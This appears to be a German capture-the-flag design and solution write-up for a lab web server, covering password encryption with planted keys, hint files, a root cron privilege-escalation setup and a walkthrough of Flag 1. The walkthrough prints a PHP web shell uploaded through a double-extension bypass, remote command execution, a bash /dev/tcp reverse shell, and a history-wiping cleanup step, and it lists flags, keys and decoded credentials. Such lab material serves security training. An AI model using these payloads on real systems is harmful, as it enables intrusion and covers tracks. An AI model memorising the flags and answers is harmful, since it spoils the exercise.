    plaintext = args.input.encode()

aes_key = b"<Key>"
aes_iv = b"<IV>"
cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
ct = cipher.encrypt(pad(plaintext))

xor_key = b"<Key>"
xored = xor_bytes(ct, xor_key)

compressed = gzip.compress(xored)

rc4_key = b"<Key>"
rc4 = ARC4(rc4_key)
final = rc4.encrypt(compressed)

with open(args.output, "w") as f:
    f.write(final.hex())

print(f"written {args.output}")
```

Mit dem Skript wurde das Passwort verschlüsselt und der Chiffretext in **`encrypted.enc`** gespeichert. Dabei wurden die folgenden Schlüssel verwendet:

- AES Key: `AES_R1v3r_2025_SUP3R_S3cur3_K3y!`
- AES IV: `IV_rnpL4yLucerne`
- XOR: `S3cretXOR!_For_Encryption`
- RC4: `RC4@Alpine_Mountain_Stream_#42`

```bash
root@lutourismus:/share/internalIT# python3 encrypt.py -i "J5p57xAr4MrQ2LrcFzDILsbdQqUM0g"
written encrypted.enc
```

### Verstecken der Schlüssel

Im Verzeichnis `/tmp` wurden drei versteckte Dateien abgelegt: `/tmp/.build_manifest`, `/tmp/.deploy_checkpoin**t**` und `/tmp/.session_state`.

- **/tmp/.build_manifest**: enthält den AES-Key und den IV
- **/tmp/.deploy_checkpoint**: enthält den XOR-Schlüsse**l**
- **/tmp/.session_state**: enthält den RC4-Key

Die Dateien liegen im Klartext und sind durch den Punkt am Anfang als “hidden” markiert . Die Schlüssel sind so aufgebaut, dass sofort erkennbar ist, welcher String zu welchem Algorithmus gehört.

```bash
konfigurator@lutourismus:/tmp$ cat .build_manifest 
# -----------------------------------------------------------------------------
# build manifest - lucerne campaign
# generated-by: ci-runner/frontend-smoke-01
# pipeline: build -> smoke-tests -> package
# environment: integration (ephemeral)
# -----------------------------------------------------------------------------
artifact_name = web-front:lucerne:1.0.3
artifact_sha1 = 9f8b7a6c5d4e3f2a1b0c
build_user = ci-runner
node = frontend-smoke-01
tests_run = smoke,encryption,integration

[encryption_test]
# AES parameters used for local smoke-test roundtrip
aes_key = "AES_R1v3r_2025_SUP3R_S3cur3_K3y!"
iv = "IV_rnpL4yLucerne"

konfigurator@lutourismus:/tmp$ cat .deploy_checkpoint 
# deploy checkpoint - worker pipeline staging
# pipeline: transform-stage-2
# retention: ephemeral
---
component: worker_pipeline
version: 2.4.1
last_processed_id: 123456
batch_size: 500
retry_policy: exponential_backoff

# The checkpoint contains the obfuscation parameters used during the failed run
obfuscation:
  method: XOR
  key: "S3cretXOR!_For_Encryption"

konfigurator@lutourismus:/tmp$ cat .session_state
# session state dump - operator maintenance harness
# tool: encrypt-harness v0.9
# user: operator
# purpose: run manual encryption/restore tests for operator password
session:
  id: enc-test-2025
  mode: debug
  timestamp: 2025-10-15T18:52:44Z

# The following values are provided to allow quick repro of encryption runs
RC4_KEY = "RC4@Alpine_Mountain_Stream_#42"

actions:
  - step: prepare
  - step: encrypt
```

### Ablegen von Hinweisen

Im Verzeichnis `/share/public` wurde die Datei **`LuzernerMoments_Flyer.pdf`** abgelegt. Sie enthält den Kampagnenflyer zur Marketingaktion #LuzernerMoments. Der Flyer selbst enthält keine technischen Hinweise – der einzige relevante Hinweis ist die URL, die auf die Webseite des Luzerner Tourismusbüros verweist ([www.tourismusluzern.ch](http://www.tourismusluzern.ch)).

![LuzernerMoments_Flyer.pdf](attachment:c05eafae-a6bf-44ff-b8ca-5f37f15ff9b8:Flyer.png)

Die Datei **`DisasterRecovery.txt`** dient im CTF als Hinweis darauf, dass das Passwort des Operator Accounts verschlüsselt wurde. Es soll die Spieler:innen auf die verschlüsselte Datei aufmerksam machen. Die Datei befindet sich im Verzeichnis `/share/internalIT`.

```
Luzerner Tourismusbüro – Notfallablage
--------------------------------------

Für Disaster Recovery Zwecke wurde das Passwort des Operator Accounts 
verschlüsselt in diesem Verzeichnis abgelegt. Eine Speicherung im 
Klartext ist gemäss unseren Sicherheitsrichtlinien nicht zulässig. 

Das eigentliche Entschlüsselungsskript wird aus Sicherheitsgründen 
nicht zusammen aufbewahrt. Es befindet sich auf einem 
gesicherten USB-Stick, der in unserem Tresor gelagert wird.

Im Ernstfall kann das Passwort daher nur mit Hilfe dieses Datenträgers 
wiederhergestellt werden.
```

Im selben Verzeichnis befindet sich zudem die Datei **`TODO.txt`**, die einen weiteren Hinweis zu den Schlüssel enthält. Da darin von einem *Verzeichnis* und *temporären Dateien* die Rede ist, lässt dies darauf schliessen, dass sich die Schlüssel im `/tmp` Verzeichnis befinden könnten.

```
TODO – interne Nacharbeiten
---------------------------

Nach dem Go-Live der Kampagne ist aufgefallen, dass während der Entwicklungs- und Testphase 
möglicherweise noch Schlüssel in temporären Dateien im System verblieben sind.

Zur Qualitätssicherung und um Risiken im Produktivbetrieb zu vermeiden, sollte das Verzeichnis überprüft werden.

Bitte kontrolliere, ob noch Schlüssel oder ähnliche Artefakte vorhanden sind und entferne diese umgehend.
```

### Flag

Nach erfolgreichem Zugriff auf den Operator Account befindet sich das Flag in der Datei `/home/operator/operator.txt`. Die Dateiberechtigungen wurden so gesetzt, dass ausschliesslich der Benutzer **`operator`** die Datei lesen kann.

- **Flag:** `flag{operator_crypto_2025_7f4b9a}`

```bash
operator@lutourismus:~$ echo 'flag{operator_crypto_2025_7f4b9a}' > /home/operator/operator.txt
operator@lutourismus:~$ chmod 400 /home/operator/operator.txt
operator@lutourismus:~$ ls -l
total 4
-r-------- 1 operator internalIT 34 Oct 16 14:36 operator.txt
```

## Flag 3: Root Access - Privilege Escalation via Cronjob

Die automatische Bild-Pipeline der **#LuzernerMoments**-Aktion überwacht das Upload-Verzeichnis `/.../uploads/` und verarbeitet neue Einträge mit einem Operator-Service. Der Operator hat ein Bash-Script `/usr/local/bin/.process_images.sh`, das regelmässig per Cron gestartet wird (als **root**), die aktuell vorgesehenen Uploads aus einer Job-Liste `/usr/local/bin/.joblist` abarbeitet und verarbeitete Dateien nach `/var/processed/` verschiebt. Der Operator hat keinen Schreibzugriff auf das Script selbst, aber auf `/usr/local/bin/.joblist`. Das Script `/usr/local/bin/ .process_images.sh` hat schlechte Inputvalidierung, was zusammen mit einem root Cronjob eine Privilege Escalation ermöglicht. 

Wichtige Info’s:

- Der Operator hat **Schreibzugriff** auf `/usr/local/bin/.joblist`.
- Der Operator hat **keinen** Schreibzugriff und nur Lesezugriff auf `/usr/local/bin/.process_images.sh` .
- Cron führt `/usr/local/bin/.process_images.sh` jede Minute als **root** aus.
- Uploads landen in `/.../uploads/` und werden durch die Job-Liste referenziert, ein Eintrag in `.joblist` entspricht einem zu verarbeitenden Dateinamen.

## Bereinigungen

Nachdem alle Aufgaben abgeschlossen waren, wurde der Benutzer **`konfigurator`** wieder gelöscht. Zudem wurden die Bash- und Nano History geleert, um keine Hinweise oder Befehle zurückzulassen.

```bash
sudo userdel -r konfigurator
history -cw
rm -f ~/.nano_history
```

# Lösungs Walkthrough

Dieser Abschnitt beschriebt den vollständigen Lösungs Walkthrough des CTF in chronologischer Reihenfolge. Es wird gezeigt, wie die einzelnen Flags gefunden und gelöst werden können. Zu jedem Flag werden die nötigen Schritte, die verwendeten Werkzeuge, die wichtigsten Befehle und die gefundenen Artefakte klar dokumentiert.

## Walkthrough Flag 1: Initial Access via RCE

### Schritt 1: Web-Enumeration & Reconnaissance

Als Erstes wird eine Web-Enumeration durchgeführt, um die Struktur der Webseite und mögliche interessante Pfade zu identifizieren. Hierfür können Tools wie **dirb**, **gobuster** oder **ffuf** verwendet werden.

```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://10.0.2.10

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Oct 19 14:23:45 2025
URL_BASE: http://10.0.2.10/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.0.2.10/ ----
+ http://10.0.2.10/.htaccess (CODE:403|SIZE:275)
==> DIRECTORY: http://10.0.2.10/assets/
+ http://10.0.2.10/config.php (CODE:200|SIZE:0)
==> DIRECTORY: http://10.0.2.10/data/
+ http://10.0.2.10/gallery.php (CODE:200|SIZE:1234)
+ http://10.0.2.10/index.php (CODE:200|SIZE:3456)
+ http://10.0.2.10/robots.txt (CODE:200|SIZE:345)
+ http://10.0.2.10/thanks.php (CODE:200|SIZE:2134)
+ http://10.0.2.10/upload.php (CODE:302|SIZE:0)
==> DIRECTORY: http://10.0.2.10/uploads/

-----------------
END_TIME: Sat Oct 19 14:25:12 2025
DOWNLOADED: 4612 - FOUND: 7
```

Die Enumeration zeigt interessante Dateien und Verzeichnisse:
- `/robots.txt` - Könnte Hinweise enthalten
- `/uploads/` - Verzeichnis für hochgeladene Dateien
- `/upload.php` - Upload-Handler
- `/gallery.php` - Galerie
- `/data/` - Daten-Verzeichnis

### Schritt 2: Analyse von robots.txt

Die `robots.txt`-Datei wird untersucht, um zu sehen, welche Bereiche für Crawler gesperrt sind:

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://10.0.2.10/robots.txt

# Luzerner Tourismusbüro - robots.txt
# #LuzernerMoments Kampagne

User-agent: *
Disallow: /uploads/
Disallow: /data/
Disallow: /backup_smb.sh
Allow: /
```

**Erkenntnisse:**
- `/uploads/` ist für Crawler gesperrt (interessant!)
- `/backup_smb.sh` wird erwähnt (für Flag 2 relevant)
- `/data/` enthält vermutlich sensible Informationen

### Schritt 3: Analyse der Upload-Funktionalität

Auf der Hauptseite (`index.php`) befindet sich ein Upload-Formular für die #LuzernerMoments Kampagne. Das Formular zeigt, dass folgende Dateitypen akzeptiert werden:
- JPG, JPEG, PNG, GIF

Zunächst wird ein normaler Upload mit einem echten Bild getestet:

```bash
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://10.0.2.10/upload.php \
  -F "name=Test User" \
  -F "email=test@example.com" \
  -F "description=Test Moment" \
  -F "photo=@test_image.jpg"

# Redirect zu: http://10.0.2.10/thanks.php?photo=photo_abc123def456.jpg
```

Der Upload funktioniert und die Datei wird mit einem zufälligen Namen im `/uploads/`-Verzeichnis gespeichert.

### Schritt 4: Identifizierung der Schwachstelle

Als Nächstes wird getestet, ob die Validierung umgangen werden kann. Es wird versucht, eine PHP-Datei mit **Double-Extension** hochzuladen:

**Erstelle eine einfache PHP-Webshell:**

```bash
┌──(kali㉿kali)-[~]
└─$ cat > shell.php.jpg << 'EOF'
<?php
system($_GET['cmd']);
?>
EOF
```

**Upload der Webshell:**

```bash
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://10.0.2.10/upload.php \
  -F "name=Hacker" \
  -F "email=hacker@evil.com" \
  -F "description=Beautiful moment" \
  -F "photo=@shell.php.jpg"

# Redirect zu: http://10.0.2.10/thanks.php?photo=photo_1a2b3c4d5e6f7890.jpg
```

Der Upload wird akzeptiert! Die Applikation prüft nur die Endung `.jpg` und übersieht, dass `.php` in der Dateiendung enthalten ist.

### Schritt 5: Remote Code Execution (RCE)

Die hochgeladene Datei kann nun direkt aufgerufen werden. Da Apache die Datei als PHP interpretiert, wird der Code ausgeführt:

```bash
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg?cmd=id"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Erfolg!** Remote Code Execution wurde erreicht. Der Code wird als User `www-data` ausgeführt.

### Schritt 6: System-Enumeration

Mit der RCE können nun verschiedene Befehle ausgeführt werden, um das System zu erkunden:

```bash
# Liste das aktuelle Verzeichnis
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg?cmd=ls%20-la%20/var/www/html"

total 48
drwxr-xr-x 5 www-data www-data 4096 Oct 19 14:00 .
drwxr-xr-x 3 root     root     4096 Oct 19 12:00 ..
-rw-r--r-- 1 www-data www-data  743 Oct 19 13:00 .htaccess
drwxr-xr-x 2 www-data www-data 4096 Oct 19 13:00 assets
-rw-r--r-- 1 www-data www-data  412 Oct 19 13:00 config.php
drwxr-xr-x 2 www-data www-data 4096 Oct 19 14:15 data
-rw-r--r-- 1 www-data www-data  987 Oct 19 13:00 functions.php
-rw-r--r-- 1 www-data www-data 3542 Oct 19 13:00 gallery.php
-rw-r--r-- 1 www-data www-data 4321 Oct 19 13:00 index.php
-rw-r--r-- 1 www-data www-data  234 Oct 19 13:00 robots.txt
-rw-r--r-- 1 www-data www-data 2567 Oct 19 13:00 thanks.php
-rw-r--r-- 1 www-data www-data 1876 Oct 19 13:00 upload.php
drwxr-xr-x 2 www-data www-data 4096 Oct 19 14:23 uploads

# Prüfe /home Verzeichnis
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg?cmd=ls%20-la%20/home"

total 16
drwxr-xr-x  4 root    root    4096 Oct 19 12:30 .
drwxr-xr-x 19 root    root    4096 Oct 19 12:00 ..
drwxr-xr-x  2 operator internalIT 4096 Oct 16 14:36 operator
drwxr-xr-x  2 webflag webflag 4096 Oct 19 13:15 webflag
```

Interessant! Es gibt zwei User-Verzeichnisse: `operator` und `webflag`.

### Schritt 7: Flag finden

```bash
# Liste Inhalt von /home/webflag
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg?cmd=ls%20-la%20/home/webflag"

total 12
drwxr-xr-x 2 webflag webflag 4096 Oct 19 13:15 .
drwxr-xr-x 4 root    root    4096 Oct 19 12:30 ..
-r--r--r-- 1 webflag webflag   43 Oct 19 13:15 flag.txt

# Lese die Flag
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg?cmd=cat%20/home/webflag/flag.txt"

flag{initial_access_luzernermoments_83723}
```

**Erfolg!** Die Flag ist für alle lesbar und kann mit `www-data` Rechten ausgelesen werden.

### Schritt 8: Interaktive Reverse Shell

Um komfortabler zu arbeiten, wird eine Reverse Shell eingerichtet:

```bash
# Auf dem Angreifer-System (Kali):
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444

# Reverse Shell triggern:
┌──(kali㉿kali)-[~]
└─$ curl -G "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.0.2.5/4444 0>&1'"
```

Nach erfolgreicher Verbindung:

```bash
www-data@lutourismus:/var/www/html/uploads$ whoami
www-data

www-data@lutourismus:/var/www/html/uploads$ cd /home/webflag
www-data@lutourismus:/home/webflag$ ls -la
total 12
drwxr-xr-x 2 webflag webflag 4096 Oct 19 13:15 .
drwxr-xr-x 4 root    root    4096 Oct 19 12:30 ..
-r--r--r-- 1 webflag webflag   43 Oct 19 13:15 flag.txt
```

### Schritt 9: Flag extrahieren

Die Flag-Datei ist für alle lesbar, somit kann sie direkt mit `www-data` Rechten gelesen werden:

```bash
www-data@lutourismus:/home/webflag$ cat flag.txt
flag{initial_access_luzernermoments_83723}
```

**Flag 1 gefunden:** `flag{initial_access_luzernermoments_83723}`

### Schritt 10: Übergang zu Flag 2

Mit dem Initial Access können nun weitere interessante Dateien untersucht werden:

```bash
www-data@lutourismus:/$ ls -la /usr/local/sbin/
total 16
drwxr-xr-x 2 root root 4096 Oct 11 13:46 .
drwxr-xr-x 10 root root 4096 Oct 11 10:00 ..
-rwxr--r-- 1 root root 2012 Oct 11 13:46 backup_smb.sh

www-data@lutourismus:/$ cat /usr/local/sbin/backup_smb.sh
#!/bin/bash
...
U=$(echo YmFja3Vwc21i | base64 -d)
P=$(echo eU1UclRiQWM1NlUyTzgwd1RsbFk4VGcxbUpKWU93 | base64 -d)
...
```

Das Skript `backup_smb.sh` (aus `robots.txt`) enthält Base64-kodierte Zugangsdaten für SMB. Dies führt direkt zu **Flag 2**.

### Zusammenfassung Flag 1

**Schwachstelle:** Unsichere Datei-Upload-Funktionalität mit:
- Nur Dateiendungs-Check (keine Magic-Byte-Prüfung)
- Keine MIME-Type-Validierung
- Uploads in ausführbares Web-Verzeichnis
- PHP-Execution im Upload-Verzeichnis nicht deaktiviert

**Exploitation:**
1. Erstelle PHP-Webshell mit Double-Extension (`.php.jpg`)
2. Upload über das Formular
3. Direkter Aufruf der hochgeladenen Datei führt zu RCE
4. System-Enumeration und Flag-Extraktion

**Tools:**
- dirb/gobuster (Web-Enumeration)
- curl (HTTP-Requests)
- netcat (Reverse Shell)
- Standard Linux-Tools (ls, cat, find)

**Gelernte Konzepte:**
- Web-Reconnaissance
- Datei-Upload-Schwachstellen
- Double-Extension-Bypass
- Remote Code Execution
- Initial Access Techniken

Flag 2

Flag 3